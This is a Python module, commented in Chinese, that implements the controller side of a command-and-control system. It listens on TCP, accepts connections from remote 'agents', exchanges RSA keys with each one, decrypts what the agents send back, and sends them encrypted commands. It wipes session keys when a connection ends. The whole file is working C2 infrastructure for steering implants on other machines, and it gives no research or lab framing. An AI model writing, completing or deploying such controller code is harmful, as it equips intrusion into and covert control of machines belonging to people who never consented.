"""
C2 控制端通信服务
管理 TCP 监听、Agent 连接、消息收发
"""
import socket
import struct
import threading
import logging
import time
import uuid
from typing import Callable, Optional

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.crypto import CryptoEngine, serialize_message, deserialize_message
from shared.protocol import MSG_KEY_EXCHANGE, MSG_REGISTER, MSG_CMD

logger = logging.getLogger("comm_server")


class CommServer:
    """C2 通信服务端"""

    def __init__(self, host: str = "0.0.0.0", port: int = 9999):
        self.host = host
        self.port = port
        self.server_sock = None
        self.crypto = None
        self._on_connect = None
        self._on_message = None
        self._running = False
        self._sessions = {}  # session_id -> (socket, addr, agent_crypto)
        self._lock = threading.Lock()

    def set_crypto(self, crypto: CryptoEngine):
        self.crypto = crypto

    def set_on_connect(self, callback: Callable):
        self._on_connect = callback

    def set_on_message(self, callback: Callable):
        self._on_message = callback

    def start(self):
        """启动 TCP 监听"""
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(10)
        self._running = True

        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        accept_thread.start()

    def stop(self):
        """停止服务"""
        self._running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        """接受连接循环"""
        while self._running:
            try:
                self.server_sock.settimeout(1.0)
                try:
                    client_sock, addr = self.server_sock.accept()
                except socket.timeout:
                    continue

                session_id = str(uuid.uuid4())
                logger.info(f"New connection from {addr}, assigned session {session_id[:8]}")

                # 为每个连接创建独立的加密引擎
                agent_crypto = CryptoEngine()
                agent_crypto.generate_rsa_keypair()

                with self._lock:
                    self._sessions[session_id] = {
                        "sock": client_sock,
                        "addr": addr,
                        "crypto": agent_crypto,
                    }

                # 通知上层
                if self._on_connect:
                    self._on_connect(session_id, addr)

                # 启动该连接的接收线程
                recv_thread = threading.Thread(
                    target=self._recv_loop,
                    args=(session_id, client_sock, agent_crypto),
                    daemon=True,
                )
                recv_thread.start()

                # 发送控制端公钥给 Agent（密钥交换第一步）
                self._send_public_key(session_id, client_sock, agent_crypto)

            except Exception as e:
                if self._running:
                    logger.error(f"Accept error: {e}")

    def _send_public_key(self, session_id: str, sock: socket.socket, crypto: CryptoEngine):
        """向 Agent 发送控制端公钥"""
        try:
            pub_key = crypto.get_public_key_pem()
            wire_data = serialize_message({
                "header": {
                    "session_id": session_id,
                    "seq": 0,
                    "timestamp": time.time(),
                    "channel": "tcp",
                    "type": MSG_KEY_EXCHANGE,
                },
                "encrypted_key": b"",
                "nonce": b"",
                "payload": pub_key,
                "tag": b"",
            })
            sock.sendall(wire_data)
            logger.info(f"Sent public key to session {session_id[:8]}")
        except Exception as e:
            logger.error(f"Failed to send public key: {e}")

    def _recv_loop(self, session_id: str, sock: socket.socket, crypto: CryptoEngine):
        """单个 Agent 连接的接收循环"""
        while self._running:
            try:
                sock.settimeout(60)
                length_data = self._recv_exact(sock, 4)
                if not length_data:
                    break
                length = struct.unpack("!I", length_data)[0]
                body = self._recv_exact(sock, length)
                if not body:
                    break

                raw = length_data + body
                msg, _ = deserialize_message(raw)
                header = msg["header"]
                msg_type = header.get("type", "unknown")

                # 处理密钥交换：Agent 发送其公钥
                if msg_type == MSG_KEY_EXCHANGE:
                    agent_pub_key = msg["payload"]
                    crypto.load_rsa_public(agent_pub_key)
                    logger.info(f"Received agent public key for session {session_id[:8]}")
                    continue

                # 处理注册消息
                if msg_type == MSG_REGISTER:
                    try:
                        info = msg["payload"].decode("utf-8")
                        if self._on_message:
                            self._on_message(session_id, msg_type, msg["payload"])
                    except Exception:
                        pass
                    continue

                # 处理普通加密消息
                if msg["encrypted_key"]:
                    plaintext = crypto.decrypt_message(msg)
                else:
                    plaintext = msg["payload"]

                if self._on_message:
                    self._on_message(session_id, msg_type, plaintext)

            except socket.timeout:
                continue
            except ConnectionResetError:
                logger.info(f"Session {session_id[:8]} disconnected")
                break
            except Exception as e:
                logger.error(f"Recv error for session {session_id[:8]}: {e}")
                break

        # 连接断开清理：先清零密钥材料，再删除 session 引用
        with self._lock:
            if session_id in self._sessions:
                session_info = self._sessions[session_id]
                # 显式清零该连接的加密引擎密钥
                if session_info.get("crypto"):
                    session_info["crypto"].wipe()
                if session_info.get("sock"):
                    try:
                        session_info["sock"].close()
                    except Exception:
                        pass
                del self._sessions[session_id]
        logger.info(f"Session {session_id[:8]} ended")

    def _recv_exact(self, sock: socket.socket, n: int) -> Optional[bytes]:
        """精确接收 n 字节"""
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def send_to(self, session, data: bytes, msg_type: str = MSG_CMD) -> bool:
        """向指定 Agent 发送加密消息"""
        with self._lock:
            session_info = self._sessions.get(session.session_id)
            if not session_info:
                return False

        try:
            sock = session_info["sock"]
            crypto = session_info["crypto"]

            msg = crypto.encrypt_message(
                data, session.session_id, channel="tcp", msg_type=msg_type
            )
            wire = serialize_message(msg)
            sock.sendall(wire)
            return True
        except Exception as e:
            logger.error(f"Send to {session.session_id[:8]} failed: {e}")
            return False

    def close_all_sessions(self):
        """关闭所有 Agent 连接并清零密钥材料"""
        with self._lock:
            for sid, info in self._sessions.items():
                try:
                    # 显式清零每个连接的密钥材料
                    if info.get("crypto"):
                        info["crypto"].wipe()
                    info["sock"].close()
                except Exception:
                    pass
            self._sessions.clear()
